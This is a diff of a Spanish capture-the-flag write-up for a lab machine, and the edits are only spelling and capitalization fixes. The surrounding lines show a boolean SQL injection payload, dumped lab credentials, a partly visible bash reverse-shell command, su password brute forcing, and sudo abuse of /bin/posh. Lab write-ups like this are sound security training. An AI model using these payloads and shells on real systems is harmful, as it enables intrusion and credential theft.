@@ -69,7 +69,7 @@ Vemos un botón de login arriba a la derecha, que nos lleva a /login_page/index.
 
 ## EXPLOTACIÓN WEB
 
-Vemos este panel. Si probamos a meter una comilla, sale un error de MySQL, por lo que es vulnerable a inyección SQL. Podemos comprobar que no es vulnerable a una inyección de tipo union based ya que no muestra los datos de las columnas, pero si que es vulnerable a una inyección boolean based. Podemos ir enviando consultas de verdadero o falso para conseguir bases de datos, tablas, columnas y registros. Por ejemplo, para sacara el primer caracter de la primera base de datos, podríamos hacer una consulta como esta: `admin' or (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='payload'-- -`, y capturar con burpsuite la petición para enviarla al intruder y poner un payload con muchos caracteres, y fijarnos en la respuesta del servidor para ver cual tiene un contenido diferente al resto, y entonces ese esrá el primer caracter. Siguiendo este concepto podemos programar un script en python que automatice todo el proceso del dump del motor MySQL: [script_SQLi](https://github.com/4bytess/dockerlabs-scripts/tree/main/showtime/SQLi).
+Vemos este panel. Si probamos a meter una comilla, sale un error de MySQL, por lo que es vulnerable a inyección SQL. Podemos comprobar que no es vulnerable a una inyección de tipo union based ya que no muestra los datos de las columnas, pero si que es vulnerable a una inyección boolean based. Podemos ir enviando consultas de verdadero o falso para conseguir bases de datos, tablas, columnas y registros. Por ejemplo, para sacar el primer caracter de la primera base de datos, podríamos hacer una consulta como esta: `admin' or (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='payload'-- -`, y capturar con burpsuite la petición para enviarla al intruder y poner un payload con muchos caracteres, y fijarnos en la respuesta del servidor para ver cual tiene un contenido diferente al resto, y entonces ese esrá el primer caracter. Siguiendo este concepto podemos programar un script en python que automatice todo el proceso del dump del motor MySQL: [script_SQLi](https://github.com/4bytess/dockerlabs-scripts/tree/main/showtime/SQLi).
 
 Usando el script, conseguimos este dump:
 
@@ -81,7 +81,7 @@ Tenemos 3 credenciales:
 - santiago:123456123456
 - joe:MICLAVEESINHACKEABLE
 
-Podemos probar todas en el panel de login de la página web. Las credenciales de lucas y santiago simplemente nos loguearan y nos dirán que estamos bienvenidos, pero la de joe nos lleva a la ruta /login_page/admin-panel.php, en la que hay un panel en el que podemos ejecutar comandos de python:
+Podemos probar todas en el panel de login de la página web. Las credenciales de Lucas y Santiago simplemente nos loguearán y nos dirán que estamos bienvenidos, pero la de Joe nos lleva a la ruta /login_page/admin-panel.php, en la que hay un panel en el que podemos ejecutar comandos de python:
 
 ![image](https://github.com/user-attachments/assets/2a6ab221-3ef9-492f-a929-7b5f24ce744d)
 
@@ -93,17 +93,17 @@ Podemos escribir el comando `import os; os.system('/bin/bash -c "bash -i >& /dev
 
 ### USUARIO JOE
 
-Podemos probar a hacer `su joe` y poner su contraseña de la base de datos, pero no funciona. Si probamos a buscar archivos SUID no hay ninguno interesante. Tampoco tenemos permisos especiales con sudo. Pero si buscamos en la ruta /tmp hay un archivo oculto llamado .hidden_text.txt. Dentro hay una lista de palabras en mayúsculas. Podemos usar esta lista como diccionario para aplicar fuerza bruta sobre el usuario luciano y joe (sabemos que existen gracias al /etc/passwd) con la herramienta [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce). Nos la descargamos en nuestra máquina con git y la traemos a la máquina con un servidor simple de python3 (`python3 -m http.server 80`). En la máquina ejecutamos en /tmp este comando `bash Linux-Su-Force.sh joe ./.hidden_text.txt` y `bash Linux-Su-Force.sh luciano ./.hidden_text.txt`. No reporta ninguna contraseña como válida. Podemos probar a pasar las contraseñas a minúscula: `tr "A-Z" "a-z" < ./.hidden_text.txt > lowercase.txt`, y volver a hacer fuerza bruta con el nuevo diccionario: `bash Linux-Su-Force.sh joe ./lowercase.txt` y `bash Linux-Su-Force.sh luciano ./lowercase.txt`. Esta vez reporta una contraseña para el usuario joe: "chittychittybangbang".
+Podemos probar a hacer `su joe` y poner su contraseña de la base de datos, pero no funciona. Si probamos a buscar archivos SUID no hay ninguno interesante. Tampoco tenemos permisos especiales con sudo. Pero si buscamos en la ruta /tmp hay un archivo oculto llamado .hidden_text.txt. Dentro hay una lista de palabras en mayúsculas. Podemos usar esta lista como diccionario para aplicar fuerza bruta sobre el usuario luciano y joe (sabemos que existen gracias al /etc/passwd) con la herramienta [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce). Nos la descargamos en nuestra máquina con git y la traemos a la máquina con un servidor simple de python3 (`python3 -m http.server 80`). En la máquina ejecutamos en /tmp este comando `bash Linux-Su-Force.sh joe ./.hidden_text.txt` y `bash Linux-Su-Force.sh luciano ./.hidden_text.txt`. No reporta ninguna contraseña como válida. Podemos probar a pasar las contraseñas a minúscula: `tr "A-Z" "a-z" < ./.hidden_text.txt > lowercase.txt`, y volver a hacer fuerza bruta con el nuevo diccionario: `bash Linux-Su-Force.sh joe ./lowercase.txt` y `bash Linux-Su-Force.sh luciano ./lowercase.txt`. Esta vez reporta una contraseña para el usuario Joe: "chittychittybangbang".
 
 Ahora nos pasamos a una conexión SSH con las credenciales joe:chittychittybangbang.
 
 ### USUARIO LUCIANO
 
-Siendo el usuario joe, podemos probar a hacer `sudo -l` para listar privilegios especiales en sudo. Vemos esto:
+Siendo el usuario Joe, podemos probar a hacer `sudo -l` para listar privilegios especiales en sudo. Vemos esto:
 
 ![image](https://github.com/user-attachments/assets/24dbd247-2a74-42ec-9cbe-5a92e89d5132)
 
-Podemos ejecutar como luciano sin proporcionar contraseña el binario /bin/posh. Si probamos a ejecutar /bin/posh vemos que se nos abre una consola. Si probamos a hacer `sudo -u luciano /bin/posh` ganamos una consola como luciano:
+Podemos ejecutar como Luciano sin proporcionar contraseña el binario /bin/posh. Si probamos a ejecutar /bin/posh vemos que se nos abre una consola. Si probamos a hacer `sudo -u luciano /bin/posh` ganamos una consola como luciano:
 
 ![image](https://github.com/user-attachments/assets/a69279d7-1b25-4557-9856-b89774bfa848)
 
